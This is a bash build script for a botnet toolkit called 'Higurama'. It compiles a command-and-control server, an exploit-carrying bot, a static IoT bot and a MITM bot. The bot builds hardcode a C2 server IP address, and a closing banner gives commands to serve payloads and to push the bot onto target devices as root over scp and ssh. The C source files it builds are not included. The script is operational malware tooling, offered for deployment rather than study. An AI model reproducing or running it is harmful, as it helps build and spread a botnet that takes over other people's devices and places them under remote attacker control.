#!/bin/bash
# compile_all_v2.sh - Compilación completa del sistema Higurama mejorado

echo "╔═══════════════════════════════════════════════════════════════╗"
echo "║          🎌 HIGURAMA COMPILATION SYSTEM V2.0 🎌              ║"
echo "╚═══════════════════════════════════════════════════════════════╝"
echo ""

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
MAGENTA='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

# Check dependencies
echo -e "${CYAN}[1/6]${NC} Checking dependencies..."
DEPS_OK=1

for dep in gcc musl-gcc openssl libssl-dev libssh-dev libjson-c-dev libcurl4-openssl-dev; do
    if ! dpkg -l | grep -q "^ii  $dep" 2>/dev/null; then
        if ! command -v $dep &> /dev/null; then
            echo -e "${YELLOW}  ⚠ $dep not found${NC}"
            DEPS_OK=0
        fi
    fi
done

if [ $DEPS_OK -eq 0 ]; then
    echo -e "${YELLOW}Installing missing dependencies...${NC}"
    apt-get update -qq
    apt-get install -y gcc musl-tools libssl-dev libssh-dev libjson-c-dev libcurl4-openssl-dev 2>/dev/null
fi

echo -e "${GREEN}  ✓ Dependencies OK${NC}"
echo ""

# Generate SSL certificates if missing
echo -e "${CYAN}[2/6]${NC} Checking SSL certificates..."
if [ ! -f "server.crt" ] || [ ! -f "server.key" ]; then
    echo -e "${YELLOW}  Generating self-signed SSL certificate...${NC}"
    openssl req -x509 -newkey rsa:4096 -keyout server.key -out server.crt -days 3650 -nodes \
        -subj "/C=JP/ST=Tokyo/L=Tokyo/O=Higurama/CN=c2.local" 2>/dev/null
    echo -e "${GREEN}  ✓ SSL certificate created${NC}"
else
    echo -e "${GREEN}  ✓ SSL certificates found${NC}"
fi
echo ""

# Compile C2 Master V2
echo -e "${CYAN}[3/6]${NC} Compiling C2 Master V2..."
gcc -Wall -O2 -I. -o higurama_v2 c2_master_v2.c \
    -lssl -lcrypto -ljson-c -lpthread -lcurl 2>&1 | grep -i "error" || true

if [ -f "higurama_v2" ]; then
    strip higurama_v2
    chmod +x higurama_v2
    SIZE=$(du -h higurama_v2 | cut -f1)
    echo -e "${GREEN}  ✓ higurama_v2 compiled successfully ($SIZE)${NC}"
else
    echo -e "${RED}  ✗ C2 Master compilation failed${NC}"
    exit 1
fi
echo ""

# Compile Higurashi Full (with SSL)
echo -e "${CYAN}[4/6]${NC} Compiling Higurashi Full..."
gcc -Wall -O2 -I. -DC2_IP='"93.95.231.134"' -o higurashi_full higurashi.c \
    -lssl -lcrypto -lssh -ljson-c -lpthread -lcurl 2>&1 | grep -i "error" || true

if [ -f "higurashi_full" ]; then
    strip higurashi_full
    chmod +x higurashi_full
    SIZE=$(du -h higurashi_full | cut -f1)
    echo -e "${GREEN}  ✓ higurashi_full compiled successfully ($SIZE)${NC}"
else
    echo -e "${RED}  ✗ Higurashi Full compilation failed${NC}"
fi
echo ""

# Compile Higurashi Mini (static, no SSL)
echo -e "${CYAN}[5/6]${NC} Compiling Higurashi Mini (static)..."
if command -v musl-gcc &> /dev/null; then
    musl-gcc -static -O2 -DC2_IP='"93.95.231.134"' -o higurashi_mini higurashi_mini.c -lpthread 2>&1 | grep -i "error" || true
    
    if [ -f "higurashi_mini" ]; then
        strip higurashi_mini
        chmod +x higurashi_mini
        SIZE=$(du -h higurashi_mini | cut -f1)
        echo -e "${GREEN}  ✓ higurashi_mini compiled successfully ($SIZE - fully static)${NC}"
    else
        echo -e "${RED}  ✗ Higurashi Mini compilation failed${NC}"
    fi
else
    echo -e "${YELLOW}  ⚠ musl-gcc not found, skipping static build${NC}"
fi
echo ""

# Compile Bot Vivi (MITM)
echo -e "${CYAN}[6/6]${NC} Compiling Bot Vivi (MITM)..."
gcc -Wall -O2 -I. -DC2_IP='"93.95.231.134"' -o vivi bot_vivi.c \
    -lssl -lcrypto -ljson-c 2>&1 | grep -i "error" || true

if [ -f "vivi" ]; then
    strip vivi
    chmod +x vivi
    SIZE=$(du -h vivi | cut -f1)
    echo -e "${GREEN}  ✓ vivi compiled successfully ($SIZE)${NC}"
else
    echo -e "${YELLOW}  ⚠ Vivi compilation failed (optional)${NC}"
fi
echo ""

# Summary
echo "╔═══════════════════════════════════════════════════════════════╗"
echo "║                    📊 COMPILATION SUMMARY                     ║"
echo "╠═══════════════════════════════════════════════════════════════╣"
echo "║                                                               ║"

if [ -f "higurama_v2" ]; then
    echo -e "║  ${GREEN}✓${NC} C2 Master V2:    ${MAGENTA}higurama_v2${NC} (dual protocol SSL+TCP)   ║"
else
    echo -e "║  ${RED}✗${NC} C2 Master V2:    ${RED}FAILED${NC}                                 ║"
fi

if [ -f "higurashi_full" ]; then
    echo -e "║  ${GREEN}✓${NC} Higurashi Full:  ${MAGENTA}higurashi_full${NC} (SSL, 100+ exploits)   ║"
else
    echo -e "║  ${YELLOW}⚠${NC} Higurashi Full:  ${YELLOW}SKIPPED${NC}                                ║"
fi

if [ -f "higurashi_mini" ]; then
    echo -e "║  ${GREEN}✓${NC} Higurashi Mini:  ${MAGENTA}higurashi_mini${NC} (static, IoT-ready)    ║"
else
    echo -e "║  ${YELLOW}⚠${NC} Higurashi Mini:  ${YELLOW}SKIPPED${NC}                                ║"
fi

if [ -f "vivi" ]; then
    echo -e "║  ${GREEN}✓${NC} Bot Vivi:        ${MAGENTA}vivi${NC} (MITM extension)               ║"
else
    echo -e "║  ${YELLOW}⚠${NC} Bot Vivi:        ${YELLOW}SKIPPED${NC}                                ║"
fi

echo "║                                                               ║"
echo "╠═══════════════════════════════════════════════════════════════╣"
echo "║                       🚀 QUICK START                          ║"
echo "╠═══════════════════════════════════════════════════════════════╣"
echo "║                                                               ║"
echo "║  Start C2:                                                    ║"
echo -e "║    ${CYAN}./higurama_v2${NC}                                              ║"
echo "║                                                               ║"
echo "║  Start HTTP payload server:                                  ║"
echo -e "║    ${CYAN}python3 -m http.server 8080 &${NC}                            ║"
echo "║                                                               ║"
echo "║  Test bot (Docker):                                           ║"
echo -e "║    ${CYAN}docker exec -it iot-router-1 /tmp/higurashi_mini${NC}         ║"
echo "║                                                               ║"
echo "║  Deploy to IoT:                                               ║"
echo -e "║    ${CYAN}scp higurashi_mini root@target:/tmp/h && ssh root@target /tmp/h &${NC} ║"
echo "║                                                               ║"
echo "╚═══════════════════════════════════════════════════════════════╝"
echo ""

# List binaries
if ls higurama_v2 higurashi_* vivi 2>/dev/null | grep -q .; then
    echo -e "${GREEN}📦 Generated binaries:${NC}"
    ls -lh higurama_v2 higurashi_* vivi 2>/dev/null | awk '{printf "  %s  %s\n", $5, $9}'
    echo ""
fi

echo -e "${MAGENTA}🎌 Higurama ready for deployment!${NC}"
